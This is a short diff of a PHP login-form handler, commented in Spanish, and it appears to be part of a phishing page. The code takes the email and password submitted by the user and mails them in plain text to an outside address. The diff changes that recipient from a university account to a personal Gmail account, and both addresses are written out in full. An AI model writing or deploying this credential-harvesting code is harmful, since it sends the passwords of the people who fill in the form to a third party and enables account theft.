@@ -6,7 +6,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
   $password = $_POST['password'];
 
   // Enviar el correo electrónico
-  $to ="steven.montoya19@unach.mx";
+  $to ="oldsteven12@gmail.com";
   $subject = "Nuevo Inicio de Sesion";
   $message = "Correo electronico: $email\nContraseña: $password";
   mail($to, $subject, $message);
